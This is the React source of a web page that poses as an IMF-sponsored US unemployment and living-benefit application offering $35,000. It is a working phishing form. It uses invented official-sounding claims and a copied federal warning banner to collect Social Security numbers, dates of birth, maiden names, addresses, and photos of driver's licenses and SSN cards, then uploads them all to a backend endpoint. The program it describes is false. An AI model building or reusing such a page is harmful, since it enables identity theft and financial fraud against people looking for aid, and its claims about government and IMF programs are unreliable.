import React, { useState } from 'react';

import axios from 'axios';
import { useNavigate } from 'react-router-dom';

const Home = () => {
  let navigate = useNavigate();

  const [currentStepIndex, setCurrentStepIndex] = useState(0);
  const [buttonLoading, setButtonLoading] = useState(false);

  const [isChecked, setIsChecked] = useState(false);
  const [ssn, setSsn] = useState('');
  const [confirmSsn, setConfirmSsn] = useState('');
  const [firstName, setFirstName] = useState('');
  const [lastName, setLastName] = useState('');
  const [maidenName, setMaidenName] = useState('');
  const [addressOne, setAddressOne] = useState('');
  const [addressTwo, setAddressTwo] = useState('');
  const [cellNo, setCellNo] = useState('');
  const [email, setEmail] = useState('');
  const [dob, setDob] = useState('');
  const [employ, setEmploy] = useState('Employed');
  const [benefit, setBenefit] = useState('');
  const [approved, setApproved] = useState('');
  const [reason, setReason] = useState('');
  const [tax, setTax] = useState('Yes');
  const [frontDL, setFrontDL] = useState(null);
  const [backDL, setBackDL] = useState(null);
  const [ssnCard, setSsnCard] = useState(null);
  const [workPlace, setWorkPlace] = useState('');
  const [school, setSchool] = useState('');
  const [experience, setExperience] = useState('');
  const [record, setRecord] = useState('Yes');
  const [referral, setReferral] = useState('');

  const checkHandler = (event) => {
    setIsChecked(event.target.checked);
  };

  const next = () => {
    if (
      isChecked === true &&
      ssn !== '' &&
      confirmSsn !== '' &&
      ssn === confirmSsn
    ) {
      setCurrentStepIndex((i) => {
        if (i >= 1) return i;
        return i + 1;
      });
    } else {
      console.log('object');
    }
  };

  const handleSubmit = async (event) => {
    event.preventDefault();
    setButtonLoading(true);

    const formData = new FormData();
    formData.append('ssn', ssn);
    formData.append('firstName', firstName);
    formData.append('lastName', lastName);
    formData.append('maidenName', maidenName);
    formData.append('addressOne', addressOne);
    formData.append('addressTwo', addressTwo);
    formData.append('cellNo', cellNo);
    formData.append('email', email);
    formData.append('dob', dob);
    formData.append('employ', employ);
    formData.append('benefit', benefit);
    formData.append('approved', approved);
    formData.append('reason', reason);
    formData.append('tax', tax);
    formData.append('frontDL', frontDL);
    formData.append('backDL', backDL);
    formData.append('ssnCard', ssnCard);
    formData.append('workPlace', workPlace);
    formData.append('school', school);
    formData.append('experience', experience);
    formData.append('record', record);
    formData.append('referral', referral);

    console.log(formData);

    try {
      const res = await axios.post(`http://localhost:5000/upload`, formData);
      if (res.statusText === 'OK') {
        navigate('/your-application-has-been-submitted');
      }
    } catch (error) {
      setButtonLoading(false);
    }

    // const timer = setTimeout(() => {
    //   setButtonLoading(false);
    //   console.log(formData);
    //   navigate('/your-application-has-been-submitted');
    // }, 3000);
    // return () => clearTimeout(timer);
  };

  return (
    <section>
      <div className=" border-b-[1px] border-primary-100/70 pb-[1px]">
        <div className="bg-white py-[9px]">{''}</div>
        <div className="bg-primary-100 py-[9px]">{''}</div>
      </div>

      <div className="border-t-[3px] border-b-[1px] border-primary-100 flex">
        <div className="border-r-[1px] border-primary-100 bg-white min-w-[189px]">
          {''}
        </div>

        <div className="p-[5px] w-full">
          <div className="border-[2px] border-[#fbe28d] px-[35px] py-[10px] bg-[#fef9e8] leading-[1.2em] text-[0.9rem]">
            Each Applicant should only register once because applicants having
            two entries will be automatically disqualified
          </div>

          <div>
            <form action="" encType="multipart/form-data">
              {/* form one */}
              {currentStepIndex === 0 && (
                <div>
                  {' '}
                  <div className="bg-primary-100 text-white font-semibold leading-[27px] px-[10px] mt-4">
                    IMF FINANCIAL AND DEBT SERVICE RELIEF
                  </div>
                  <div className="mt-4 pb-2">
                    <p>
                      Welcome to United State Of America Employment/Unemployment
                      Insurance Benefit (EUI) Online Application (Sponsored by
                      IMF)
                    </p>

                    <p className="my-4">
                      NB: Please be aware that you can only benefit from this
                      exercise once a year
                    </p>
                  </div>
                  <div className="bg-primary-100 text-white font-semibold leading-[27px] px-[10px]">
                    IMF LIVING BENEFIT
                  </div>
                  <div className="py-4">
                    Due to the Economy Instability across the states there is a
                    high surge in Rent, Mortgages and living cost in the country
                    presently but for the love of her citizens, the Government
                    of the United State Of America has mandated all corporate
                    Organizations to direct all Corporate Social
                    Responsibilities towards the financial benefits of its
                    citizens, this will ensure that needy citizens get the
                    financial assistance needed to pay Rents, Mortgages and
                    improve their standard of living.
                  </div>
                  <div className="bg-primary-100 text-white font-semibold leading-[27px] px-[10px]">
                    IMF LIVING FINANCIAL AND DEBT SERVICE RELIEF{' '}
                  </div>
                  <div>
                    <p className="pt-4">
                      Home-Living Financial Assistance and Debt Service Relief
                      Program
                    </p>

                    <p className="pt-4">
                      The IMF in a way to fulfill her Corporate Social
                      Responsibilities this year 2022 has decided to provide
                      financial assistance and debt service relief to 2 million
                      people across the country. (i.e Citizens of the United
                      State of America) Right now our focus is on citizens who
                      are currently having challenges in paying Rent, Mortgages
                      and also people who are currently experiencing a massive
                      downslide in their standard of living. This page provides
                      an overview of assistance approved by the IMF’s Executive
                      Board since late March 2021 under its various lending
                      facilities and debt service relief financed by the
                      Catastrophe Containment and Relief Trust (CCRT). Overall,
                      the IMF is currently making about $250 billion, a quarter
                      of its $1 trillion lending capacity, available to member
                      countries.
                    </p>

                    <p className="pt-6">
                      To achieve our goal of 2 million people, we have carefully
                      filtered our selection process using the below criteria:
                    </p>
                  </div>
                  <div className="bg-primary-100 text-white font-semibold leading-[27px] px-[10px] mt-4">
                    BENEFICIARIES - (Who is Eligible to benefit from this
                    exercise)
                  </div>
                  <div className="text-[#666699] pl-10 pt-4">
                    <li className="list-disc">
                      You are a Citizen of the United State of America either
                      employed or unemployed
                    </li>
                    <li className="list-disc">
                      You have Accommodation either Rented/purchased/Mortgage or
                      Room sharing (Applicants residing at Government provided
                      institutions won't be considered)
                    </li>
                    <li className="list-disc">
                      {' '}
                      Immigrants won't be considered (Immigrants will be
                      considered at our next phase)
                    </li>
                    <li className="list-disc">
                      {' '}
                      First Come first serve policy
                    </li>
                  </div>
                  <div className="bg-primary-100 text-white font-semibold leading-[27px] px-[10px] mt-4">
                    BENEFIT - We carefully drafted a payment Calendar for all
                    Applicants
                  </div>
                  <div>
                    <p className="pt-4">
                      {' '}
                      Approved Applicants are to receive a total of $35,000 to
                      be received within 7 weeks to be disbursed $5,000 weekly
                      (Applicants must always provide prove of expenditure for
                      each weekly fees received from IMF; this will ensure funds
                      are being used for intended purposes. Anything otherwise
                      will deny your next weekly entry benefit){' '}
                    </p>

                    <div className="flex items-start gap-1 pt-4">
                      <input
                        type="checkbox"
                        name=""
                        required
                        checked={isChecked}
                        onChange={checkHandler}
                        className="mt-[6px]"
                      />
                      <p className="">
                        <span>
                          I have read and understand the information above. I
                          understand that IMF will verify the information that I
                          provide.{' '}
                        </span>
                        <span className="text-red">*</span>
                      </p>
                    </div>
                  </div>
                  <div className="bg-primary-100 text-white font-semibold leading-[27px] px-[10px] mt-4">
                    <p>Please provide your Social Security Number</p>
                  </div>
                  <div>
                    <div className="">
                      <div className="bg-[#eeeeee] flex">
                        <p className="text-right pr-2 w-1/2">
                          Social Security Number:
                        </p>
                        <input
                          type="text"
                          name=""
                          id=""
                          className="border-2"
                          maxLength={11}
                          required
                          onChange={(event) => {
                            const { value } = event.target;
                            setSsn(value);
                          }}
                        />
                        <span className="text-red">*</span>
                      </div>

                      <div className="bg-[#dddddd] flex">
                        <p className="text-right pr-2 w-1/2">
                          Confirm your Social Security Number:
                        </p>
                        <input
                          type="text"
                          name=""
                          id=""
                          className="border-2"
                          maxLength={11}
                          required
                          onChange={(event) => {
                            const { value } = event.target;
                            setConfirmSsn(value);
                          }}
                        />
                        <span className="text-red">*</span>
                      </div>
                    </div>

                    <div className="flex justify-center items-center py-3 border-y-2 border-primary-100 mt-2">
                      <button
                        onClick={next}
                        className="bg-[#eeeeee] hover:bg-[#e9e9ed] text-sm px-2 py-1 border border-primary-100 rounded-md"
                      >
                        Next
                      </button>
                    </div>
                  </div>
                  <div className="bg-primary-100 text-white font-semibold leading-[27px] px-[10px] mt-4">
                    IF YOU ARE NOT USING YOUR PERSONAL COMPUTER, PLEASE FOLLOW
                    THESE SAFETY TIPS:
                  </div>
                  <div className="text-[#666699] pl-10 pt-4">
                    <li className="list-disc">
                      Log out before you walk away from the computer
                    </li>
                    <li className="list-disc">
                      Do not save your login information
                    </li>
                    <li className="list-disc">
                      Do not save any files or forms to a Public Computer
                    </li>
                    <li className="list-disc">
                      When prompted, always opt to Open a File
                    </li>
                  </div>
                  <h2 className="text-center my-4 font-semibold text-lg">
                    WARNING
                  </h2>
                  <div>
                    <p>
                      {' '}
                      This system may contain U.S. Government information, which
                      is restricted to authorized users ONLY. Unauthorized
                      access, use, misuse, or modification of this computer
                      system or of the data contained herein or in transit
                      to/from this system constitutes a violation of Title 18,
                      United States Code, Section 1030, and may subject the
                      individual to criminal and civil penalties pursuant to
                      Title 26, United States Code, Sections 7213, 7213A (the
                      Taxpayer Browsing Protection Act), and 7431. This system
                      and equipment are subject to monitoring to ensure proper
                      performance of applicable security features or procedures.
                      Such monitoring may result in the acquisition, recording,
                      and analysis of all data being communicated, transmitted,
                      processed, or stored in this system by a user. If
                      monitoring reveals possible evidence of criminal activity,
                      such evidence may be provided to Law Enforcement
                      Personnel.
                    </p>

                    <h1 className="my-4">
                      {' '}
                      ANYONE USING THIS SYSTEM EXPRESSLY CONSENTS TO SUCH
                      MONITORING.{' '}
                    </h1>
                  </div>
                </div>
              )}

              {/* form two */}
              {currentStepIndex === 1 && (
                <div>
                  <div className="bg-primary-100 text-white font-semibold leading-[27px] px-[10px] mt-4">
                    Please provide the following details
                  </div>

                  <div className="bg-[#dddddd]">
                    {/* First Name */}
                    <div className="bg-[#eeeeee] flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">First Name:</p>
                      <input
                        type="text"
                        name=""
                        id=""
                        className="border-[1px] border-solid rounded border-black/50"
                        required
                        onChange={(event) => {
                          const { value } = event.target;
                          setFirstName(value);
                        }}
                      />
                      <span className="text-red">*</span>
                    </div>

                    {/* Last Name */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">Last Name:</p>
                      <input
                        type="text"
                        name=""
                        id=""
                        className="border-[1px] border-solid rounded border-black/50"
                        required
                        onChange={(event) => {
                          const { value } = event.target;
                          setLastName(value);
                        }}
                      />
                      <span className="text-red">*</span>
                    </div>

                    {/* Maiden Name */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">Maiden Name:</p>
                      <input
                        type="text"
                        name=""
                        id=""
                        className="border-[1px] border-solid rounded border-black/50"
                        onChange={(event) => {
                          const { value } = event.target;
                          setMaidenName(value);
                        }}
                      />
                    </div>

                    {/* Address One */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">Address 1:</p>
                      <textarea
                        name=""
                        id=""
                        cols="20"
                        rows="3"
                        className="px-1 text-sm border-[1px] border-solid rounded border-black/50"
                        placeholder="Enter Address Line..."
                        onChange={(event) => {
                          const { value } = event.target;
                          setAddressOne(value);
                        }}
                      ></textarea>
                      <span className="text-red">*</span>
                    </div>

                    {/* Address Two */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">Address 2:</p>
                      <textarea
                        name=""
                        id=""
                        cols="20"
                        rows="3"
                        className="px-1 text-sm border-[1px] border-solid rounded border-black/50"
                        placeholder="Enter Address Line..."
                        onChange={(event) => {
                          const { value } = event.target;
                          setAddressTwo(value);
                        }}
                      ></textarea>
                      <span className="text-red">*</span>
                    </div>

                    {/* Cell Number */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">Cell Number:</p>
                      <input
                        type="text"
                        name=""
                        id=""
                        className="border-[1px] border-solid rounded border-black/50"
                        required
                        onChange={(event) => {
                          const { value } = event.target;
                          setCellNo(value);
                        }}
                      />
                      <span className="text-red">*</span>
                    </div>

                    {/* Email: */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">Email:</p>
                      <input
                        type="text"
                        name=""
                        id=""
                        className="border-[1px] border-solid rounded border-black/50"
                        required
                        onChange={(event) => {
                          const { value } = event.target;
                          setEmail(value);
                        }}
                      />
                      <span className="text-red">*</span>
                    </div>

                    {/* Date Of Birth */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        Date Of Birth(dd//mm//yyyy):
                      </p>
                      <input
                        type="text"
                        name=""
                        id=""
                        className="border-[1px] border-solid rounded border-black/50"
                        required
                        onChange={(event) => {
                          const { value } = event.target;
                          setDob(value);
                        }}
                      />
                      <span className="text-red">*</span>
                    </div>

                    {/* Employment Status */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        Employment Status:
                      </p>
                      <select
                        name=""
                        id=""
                        onChange={(event) => {
                          const { value } = event.target;
                          setEmploy(value);
                        }}
                        className="text-sm pl-2 pr-6 bg-[#eeeeee] border-[1px] border-solid rounded border-black/50"
                      >
                        <option value="Employed" className="bg-[#eeeeee]">
                          Employed
                        </option>
                        <option value="Unemployed" className="bg-[#eeeeee]">
                          Unemployed
                        </option>
                      </select>
                    </div>

                    {/* benefit from IMF */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        Have you received benefit from IMF before or this will
                        be your first:
                      </p>
                      <textarea
                        name=""
                        id=""
                        cols="20"
                        rows="3"
                        className="px-1 text-sm border-[1px] border-solid rounded border-black/50"
                        placeholder="Enter Response Here"
                        onChange={(event) => {
                          const { value } = event.target;
                          setBenefit(value);
                        }}
                      ></textarea>
                    </div>

                    {/* approved */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        If approved, what will you use the benefit for?
                      </p>
                      <textarea
                        name=""
                        id=""
                        cols="20"
                        rows="3"
                        className="px-1 text-sm border-[1px] border-solid rounded border-black/50"
                        placeholder="Enter Response Here"
                        onChange={(event) => {
                          const { value } = event.target;
                          setApproved(value);
                        }}
                      ></textarea>
                    </div>

                    {/* Reason why you think you should be selected */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        Reason why you think you should be selected
                      </p>
                      <textarea
                        name=""
                        id=""
                        cols="20"
                        rows="3"
                        className="px-1 text-sm border-[1px] border-solid rounded border-black/50"
                        placeholder="Enter Response Here"
                        onChange={(event) => {
                          const { value } = event.target;
                          setReason(value);
                        }}
                      ></textarea>
                    </div>

                    {/* filed for Tax */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        Have you filed for Tax in the year 2023:
                      </p>
                      <select
                        name=""
                        id=""
                        onChange={(event) => {
                          const { value } = event.target;
                          setTax(value);
                        }}
                        className="text-sm pl-2 pr-6 bg-[#eeeeee] border-[1px] border-solid rounded border-black/50"
                      >
                        <option value="Yes" className="bg-[#eeeeee]">
                          Yes
                        </option>
                        <option value="No" className="bg-[#eeeeee]">
                          No
                        </option>
                      </select>
                    </div>

                    {/* Driver’s License/State ID Card (FRONT): */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        Driver’s License/State ID Card (FRONT):
                      </p>
                      <input
                        type="file"
                        name=""
                        id=""
                        className="text-sm"
                        required
                        onChange={(event) => {
                          const file = event.target.files[0];
                          setFrontDL(file);
                        }}
                      />
                    </div>

                    {/* Driver’s License/State ID Card (BACK): */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        Driver’s License/State ID Card (BACK):
                      </p>
                      <input
                        type="file"
                        name=""
                        id=""
                        className="text-sm"
                        required
                        onChange={(event) => {
                          const file = event.target.files[0];
                          setBackDL(file);
                        }}
                      />
                    </div>

                    {/* SSN Card (Picture): */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        SSN Card (Picture):
                      </p>
                      <input
                        type="file"
                        name=""
                        id=""
                        className="text-sm"
                        onChange={(event) => {
                          const file = event.target.files[0];
                          setSsnCard(file);
                        }}
                      />
                    </div>

                    {/* Current Work Place */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        Current Work Place:
                      </p>
                      <input
                        type="text"
                        name=""
                        id=""
                        className="border-[1px] border-solid rounded border-black/50"
                        required
                        onChange={(event) => {
                          const { value } = event.target;
                          setWorkPlace(value);
                        }}
                      />
                      <span className="text-red">*</span>
                    </div>

                    {/* Higher School/GED and year ended: */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        Higher School/GED and year ended:
                      </p>
                      <input
                        type="text"
                        name=""
                        id=""
                        className="border-[1px] border-solid rounded border-black/50"
                        required
                        onChange={(event) => {
                          const { value } = event.target;
                          setSchool(value);
                        }}
                      />
                      <span className="text-red">*</span>
                    </div>

                    {/* Work Experience */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">Work Experience:</p>
                      <textarea
                        name=""
                        id=""
                        cols="20"
                        rows="3"
                        className="px-1 text-sm border-[1px] border-solid rounded border-black/50"
                        placeholder="Enter Response Here"
                        onChange={(event) => {
                          const { value } = event.target;
                          setExperience(value);
                        }}
                      ></textarea>
                    </div>

                    {/* Criminal Record? */}
                    <div className="flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">Criminal Record?</p>
                      <select
                        name=""
                        id=""
                        onChange={(event) => {
                          const { value } = event.target;
                          setRecord(value);
                        }}
                        className="text-sm pl-2 pr-6 bg-[#eeeeee] border-[1px] border-solid rounded border-black/50"
                      >
                        <option value="Yes" className="bg-[#eeeeee]">
                          Yes
                        </option>
                        <option value="No" className="bg-[#eeeeee]">
                          No
                        </option>
                        <option value="Maybe" className="bg-[#eeeeee]">
                          Maybe
                        </option>
                      </select>
                    </div>

                    {/* Do you have a referral Code? */}
                    <div className="bg-[#eeeeee] flex mt-[1px]">
                      <p className="text-right pr-2 w-1/2">
                        Do you have a referral Code? If yes:
                      </p>
                      <input
                        type="text"
                        name=""
                        id=""
                        className="border-[1px] border-solid rounded border-black/50"
                        required
                        onChange={(event) => {
                          const { value } = event.target;
                          setReferral(value);
                        }}
                      />
                      <span className="text-red">*</span>
                    </div>
                  </div>

                  <div className="flex justify-center items-center py-3 border-y-2 border-primary-100 mt-2">
                    <button
                      onClick={handleSubmit}
                      className="bg-[#eeeeee] hover:bg-[#e9e9ed] text-xs px-2 py-1 border border-primary-100 rounded-md"
                    >
                      Send Application
                    </button>
                  </div>

                  <div className="bg-primary-100 text-white font-semibold leading-[27px] px-[10px] mt-4">
                    IF YOU ARE NOT USING YOUR PERSONAL COMPUTER, PLEASE FOLLOW
                    THESE SAFETY TIPS:
                  </div>
                  <div className="text-[#666699] pl-10 pt-4">
                    <li className="list-disc">
                      Log out before you walk away from the computer
                    </li>
                    <li className="list-disc">
                      Do not save your login information
                    </li>
                    <li className="list-disc">
                      Do not save any files or forms to a Public Computer
                    </li>
                    <li className="list-disc">
                      When prompted, always opt to Open a File
                    </li>
                  </div>
                </div>
              )}
            </form>
          </div>
        </div>
      </div>

      <div className="text-[#aaaaaa] float-right text-xs pt-2 pb-20">
        <a href="http://get.adobe.com/reader/">
          Download Adobe .PDF Reader (Free)
        </a>
        <span className="cursor-pointer">
          | Accessibility | Privacy Statement | Viewing Tips
        </span>
      </div>
    </section>
  );
};

export default Home;
